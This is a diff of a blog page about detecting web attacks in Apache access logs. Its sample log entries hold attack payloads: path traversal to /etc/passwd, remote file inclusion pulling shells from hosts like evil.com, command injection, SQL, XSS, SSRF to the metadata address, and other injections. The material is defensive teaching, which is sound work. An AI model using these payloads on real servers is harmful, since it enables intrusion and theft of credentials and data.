@@ -13,7 +13,16 @@
 
 
 <meta name="author" content="Yusuf Talha ARABACI">
-<meta name="description" content="In this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.">
+<meta name="description" content="
+  Attack Detection on Apache Web Server
+  
+    
+    Link to heading
+  
+
+In this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.
+
+Nowadays, web applications and sites are exposed to different types of cyber attacks. Early detection of these attacks is of great importance for the effectiveness of security measures and the continuity of the system. Apache Web Server is one of the most widely used web servers around the world and therefore it is necessary to implement the right methods for monitoring and detecting attacks.">
 <meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
 
 
@@ -21,12 +30,14 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
   <meta name="twitter:title" content="Intrusion Detection on Apache Web Server">
-  <meta name="twitter:description" content="In this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.">
+  <meta name="twitter:description" content="Attack Detection on Apache Web ServerLink to headingIn this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.
+Nowadays, web applications and sites are exposed to different types of cyber attacks. Early detection of these attacks is of great importance for the effectiveness of security measures and the continuity of the system. Apache Web Server is one of the most widely used web servers around the world and therefore it is necessary to implement the right methods for monitoring and detecting attacks.">
 
 <meta property="og:url" content="http://localhost:1313/posts/2025/06/intrusion-detection-on-apache-web-server/">
   <meta property="og:site_name" content="Yusuf Talha ARABACI">
   <meta property="og:title" content="Intrusion Detection on Apache Web Server">
-  <meta property="og:description" content="In this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.">
+  <meta property="og:description" content="Attack Detection on Apache Web ServerLink to headingIn this article, I will explain the types of web attacks and how we can detect these attacks through Apache web server access logs.
+Nowadays, web applications and sites are exposed to different types of cyber attacks. Early detection of these attacks is of great importance for the effectiveness of security measures and the continuity of the system. Apache Web Server is one of the most widely used web servers around the world and therefore it is necessary to implement the right methods for monitoring and detecting attacks.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -273,8 +284,8 @@
   </a>
 </h4>
 <p>An example Apache log containing a Directory Traversal attack is given.</p>
-<pre tabindex="0"><code>192.168.1.200 - - [01/Jun/2025:12:00:10 +0300] &#34;GET /../../../../etc/passwd HTTP/1.1&#34; 403 723 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.201 - - [01/Jun/2025:12:00:30 +0300] &#34;GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&#34; 404 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.200 - - [01/Jun/2025:12:00:10 +0300] &#34;GET /../../../../etc/passwd HTTP/1.1&#34; 403 723 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.201 - - [01/Jun/2025:12:00:30 +0300] &#34;GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&#34; 404 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.202 - - [01/Jun/2025:12:01:05 +0300] &#34;GET /admin/../../boot.ini HTTP/1.1&#34; 403 400 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -315,8 +326,8 @@
   </a>
 </h4>
 <p>An example Apache log containing the File Upload attack is given.</p>
-<pre tabindex="0"><code>192.168.1.350 - - [01/Jun/2025:23:10:45 +0300] &#34;POST /upload HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.350 - - [01/Jun/2025:23:11:00 +0300] &#34;GET /uploads/shell.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.350 - - [01/Jun/2025:23:10:45 +0300] &#34;POST /upload HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.350 - - [01/Jun/2025:23:11:00 +0300] &#34;GET /uploads/shell.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.351 - - [01/Jun/2025:23:12:10 +0300] &#34;POST /file-upload HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -355,8 +366,8 @@
   </a>
 </h4>
 <p>An example Apache log containing an RFI attack is given.</p>
-<pre tabindex="0"><code>192.168.1.210 - - [01/Jun/2025:12:30:10 +0300] &#34;GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.211 - - [01/Jun/2025:12:31:05 +0300] &#34;GET /include.php?file=https://evil.com/malware.php HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.210 - - [01/Jun/2025:12:30:10 +0300] &#34;GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.211 - - [01/Jun/2025:12:31:05 +0300] &#34;GET /include.php?file=https://evil.com/malware.php HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.212 - - [01/Jun/2025:12:32:15 +0300] &#34;GET /template.php?template=http://attacker.com/bad.inc HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -396,8 +407,8 @@
   </a>
 </h4>
 <p>An example Apache log containing an LFI attack is given.</p>
-<pre tabindex="0"><code>192.168.1.220 - - [01/Jun/2025:13:00:10 +0300] &#34;GET /index.php?page=../../../../etc/passwd HTTP/1.1&#34; 403 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.221 - - [01/Jun/2025:13:01:25 +0300] &#34;GET /load.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.220 - - [01/Jun/2025:13:00:10 +0300] &#34;GET /index.php?page=../../../../etc/passwd HTTP/1.1&#34; 403 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.221 - - [01/Jun/2025:13:01:25 +0300] &#34;GET /load.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.222 - - [01/Jun/2025:13:02:05 +0300] &#34;GET /view.php?include=../proc/self/environ HTTP/1.1&#34; 403 400 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -436,9 +447,9 @@
   </a>
 </h4>
 <p>An example Apache log containing a Brute Force attack is given.</p>
-<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:14:10:01 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.250 - - [01/Jun/2025:14:10:03 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.250 - - [01/Jun/2025:14:10:05 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:14:10:01 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.250 - - [01/Jun/2025:14:10:03 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.250 - - [01/Jun/2025:14:10:05 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.250 - - [01/Jun/2025:14:10:07 +0300] &#34;POST /login.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -478,8 +489,8 @@
   </a>
 </h4>
 <p>An example Apache log containing a Command Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.230 - - [01/Jun/2025:13:30:10 +0300] &#34;GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.231 - - [01/Jun/2025:13:31:20 +0300] &#34;GET /exec.php?cmd=ls%20-l%20%26%26%20cat%20/etc/passwd HTTP/1.1&#34; 500 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.230 - - [01/Jun/2025:13:30:10 +0300] &#34;GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.231 - - [01/Jun/2025:13:31:20 +0300] &#34;GET /exec.php?cmd=ls%20-l%20%26%26%20cat%20/etc/passwd HTTP/1.1&#34; 500 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.232 - - [01/Jun/2025:13:32:05 +0300] &#34;GET /shell.php?cmd=`whoami` HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -503,15 +514,15 @@
 </h4>
 <p>It is important to pay attention to the following signs in Apache access logs or web requests:</p>
 <ul>
-<li><strong>SQL commands in URL or parameters:</strong><br>
+<li><strong>SQL commands in URL or parameters:</strong> 
  Expressions such as <code>UNION SELECT</code>, <code>SELECT</code>, <code>INSERT</code>, <code>DROP TABLE</code>, <code>AND 1=1</code>, `` OR &lsquo;1&rsquo;=&lsquo;1&rsquo;`</li>
-<li><strong>Use of abnormal characters in parameters:</strong><br>
+<li><strong>Use of abnormal characters in parameters:</strong> 
  Single quotes <code>'</code>, double quotes <code>&quot;</code>, semicolons <code>;</code>, comment line marks <code>--</code> or <code>#</code></li>
-<li><strong>Abnormally long URL or parameter values:</strong><br>
+<li><strong>Abnormally long URL or parameter values:</strong> 
  Complex and long queries</li>
-<li><strong>Server error codes:</strong><br>
+<li><strong>Server error codes:</strong> 
  Unexpected increase in errors such as 500 Internal Server Error, 400 Bad Request</li>
-<li><strong>Repeated same parameter or query patterns:</strong><br>
+<li><strong>Repeated same parameter or query patterns:</strong> 
  Especially experimenting with different variations</li>
 </ul>
 <h4 id="sql-injection-detection-in-apache-access-logs">
@@ -522,8 +533,8 @@
   </a>
 </h4>
 <p>An example Apache log containing a SQL injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.100 - - [01/Jun/2025:10:15:42 +0300] &#34;GET /product?id=1&#39; OR &#39;1&#39;=&#39;1 HTTP/1.1&#34; 200 1234 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.101 - - [01/Jun/2025:10:16:05 +0300] &#34;GET /search?q=UNION+SELECT+username,password+FROM+users HTTP/1.1&#34; 500 532 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.100 - - [01/Jun/2025:10:15:42 +0300] &#34;GET /product?id=1&#39; OR &#39;1&#39;=&#39;1 HTTP/1.1&#34; 200 1234 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.101 - - [01/Jun/2025:10:16:05 +0300] &#34;GET /search?q=UNION+SELECT+username,password+FROM+users HTTP/1.1&#34; 500 532 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.102 - - [01/Jun/2025:10:16:25 +0300] &#34;GET /login.php?username=admin&#39;-- HTTP/1.1&#34; 200 432 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -562,8 +573,8 @@
   </a>
 </h4>
 <p>An example Apache log containing a NoSQL Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.240 - - [01/Jun/2025:15:00:10 +0300] &#34;GET /search?username[$ne]= HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.241 - - [01/Jun/2025:15:01:20 +0300] &#34;GET /login?password[$gt]= HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.240 - - [01/Jun/2025:15:00:10 +0300] &#34;GET /search?username[$ne]= HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.241 - - [01/Jun/2025:15:01:20 +0300] &#34;GET /login?password[$gt]= HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.242 - - [01/Jun/2025:15:02:15 +0300] &#34;GET /find?filter={$where: &#39;this.password.length &gt; 0&#39;} HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -590,7 +601,7 @@
 <ul>
 <li>XML special characters and structures such as &lt;, &gt;, &amp;, &lt;!ENTITY in request parameters or POST data</li>
 <li>
-<!DOCTYPE, SYSTEM, ENTITY expressions in XML content
+<!DOCTYPE, SYSTEM, ENTITY expressions in XML content
 </li>
 <li>Submissions of longer or more complex XML data than usual</li>
 <li>XML External Entity references</li>
@@ -604,7 +615,7 @@
   </a>
 </h4>
 <p>An example Apache log containing an XML Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:16:10:15 +0300] &#34;POST /api/xmlparser HTTP/1.1&#34; 400 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:16:10:15 +0300] &#34;POST /api/xmlparser HTTP/1.1&#34; 400 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.251 - - [01/Jun/2025:16:11:20 +0300] &#34;POST /service HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -643,7 +654,7 @@
   </a>
 </h4>
 <p>An example Apache log containing an LDAP Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.260 - - [01/Jun/2025:17:10:10 +0300] &#34;GET /login?user=*)(uid=*))(|(uid=*)) HTTP/1.1&#34; 401 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.260 - - [01/Jun/2025:17:10:10 +0300] &#34;GET /login?user=*)(uid=*))(|(uid=*)) HTTP/1.1&#34; 401 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.261 - - [01/Jun/2025:17:11:05 +0300] &#34;GET /search?filter=(|(objectClass=*)) HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -683,8 +694,8 @@
   </a>
 </h4>
 <p>An example Apache log containing Template Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.270 - - [01/Jun/2025:18:20:10 +0300] &#34;GET /page?template={{config}} HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.271 - - [01/Jun/2025:18:21:30 +0300] &#34;GET /render?tmpl={{self}} HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+<pre tabindex="0"><code>192.168.1.270 - - [01/Jun/2025:18:20:10 +0300] &#34;GET /page?template={{config}} HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.271 - - [01/Jun/2025:18:21:30 +0300] &#34;GET /render?tmpl={{self}} HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
 192.168.1.272 - - [01/Jun/2025:18:22:45 +0300] &#34;GET /view?content={% if 1==1 %}HELLO{% endif %} HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -724,7 +735,7 @@
   </a>
 </h4>
 <p>An example Apache log containing an HTTP Header Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.280 - - [01/Jun/2025:19:30:10 +0300] &#34;GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.280 - - [01/Jun/2025:19:30:10 +0300] &#34;GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.281 - - [01/Jun/2025:19:31:05 +0300] &#34;GET /page?lang=en%0d%0aContent-Length:%2000 HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -764,9 +775,9 @@
   </a>
 </h4>
 <p>An example Apache log containing a Content Injection attack is given.</p>
-<pre tabindex="0"><code>192.168.1.330 - - [01/Jun/2025:22:30:10 +0300] &#34;GET /search?q=&lt;div style=&#39;color:red&#39;&gt;Hacked&lt;/div&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.331 - - [01/Jun/2025:22:31:05 +0300] &#34;POST /comment HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
-192.168.1.320 - - [01/Jun/2025:22:00:10 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.330 - - [01/Jun/2025:22:30:10 +0300] &#34;GET /search?q=&lt;div style=&#39;color:red&#39;&gt;Hacked&lt;/div&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.331 - - [01/Jun/2025:22:31:05 +0300] &#34;POST /comment HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
+192.168.1.320 - - [01/Jun/2025:22:00:10 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.321 - - [01/Jun/2025:22:01:05 +0300] &#34;POST /comment HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -799,8 +810,8 @@
 <li>Encoded HTML characters: <code>%3C</code> ( &lt; ), <code>%3E</code> ( &gt; ), <code>%22</code> ( &quot; ), <code>%27</code> ( &rsquo; )</li>
 <li>Abnormally long and complex character strings in parameters</li>
 </ul>
-<p>Example parameters:<br>
-q=<script>alert(‘XSS’)</script><br>
+<p>Example parameters: 
+q=<script>alert(‘XSS’)</script> 
 search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
 <h4 id="xssdetection-in-apache-access-logs">
   XSS Detection in Apache Access Logs
@@ -810,7 +821,7 @@ search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
   </a>
 </h4>
 <p>An example Apache log containing an xss attack is given.</p>
-<pre tabindex="0"><code>192.168.1.150 - - [01/Jun/2025:11:20:35 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.150 - - [01/Jun/2025:11:20:35 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.151 - - [01/Jun/2025:11:21:12 +0300] &#34;GET /profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -849,7 +860,7 @@ search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
   </a>
 </h4>
 <p>An example Apache log containing an SSRF attack is given.</p>
-<pre tabindex="0"><code>192.168.1.300 - - [01/Jun/2025:20:15:10 +0300] &#34;GET /fetch?url=http://127.0.0.1/admin HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.300 - - [01/Jun/2025:20:15:10 +0300] &#34;GET /fetch?url=http://127.0.0.1/admin HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.301 - - [01/Jun/2025:20:16:05 +0300] &#34;GET /api/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -888,7 +899,7 @@ search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
   </a>
 </h4>
 <p>An example Apache log containing a CSRF attack is given.</p>
-<pre tabindex="0"><code>192.168.1.310 - - [01/Jun/2025:21:10:15 +0300] &#34;POST /account/change-email HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.310 - - [01/Jun/2025:21:10:15 +0300] &#34;POST /account/change-email HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.310 - - [01/Jun/2025:21:10:17 +0300] &#34;POST /account/change-email HTTP/1.1&#34; 200 512 &#34;http://malicious-site.com&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log. Although it is difficult to definitively detect a CSRF attack directly from Apache logs, log analysis can be performed for Referer checking and detection of abnormal request behavior.</p>
 <blockquote>
@@ -926,8 +937,8 @@ search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
   </a>
 </h4>
 <p>An example Apache log containing an IDOR attack is given.</p>
-<pre tabindex="0"><code>192.168.1.370 - - [02/Jun/2025:00:10:05 +0300] &#34;GET /profile?user_id=100 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
-192.168.1.370 - - [02/Jun/2025:00:10:20 +0300] &#34;GET /profile?user_id=101 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.370 - - [02/Jun/2025:00:10:05 +0300] &#34;GET /profile?user_id=100 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.370 - - [02/Jun/2025:00:10:20 +0300] &#34;GET /profile?user_id=101 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.370 - - [02/Jun/2025:00:10:35 +0300] &#34;GET /profile?user_id=102 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
@@ -966,7 +977,7 @@ search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
   </a>
 </h4>
 <p>An example Apache log containing an Open Redirect attack is given.</p>
-<pre tabindex="0"><code>192.168.1.380 - - [02/Jun/2025:00:45:10 +0300] &#34;GET /login?redirect=http://malicious.com HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+<pre tabindex="0"><code>192.168.1.380 - - [02/Jun/2025:00:45:10 +0300] &#34;GET /login?redirect=http://malicious.com HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
 192.168.1.381 - - [02/Jun/2025:00:46:05 +0300] &#34;GET /index?url=https://phishing-site.com HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
 </code></pre><p>Detection can be made by running the following query on this log.</p>
 <blockquote>
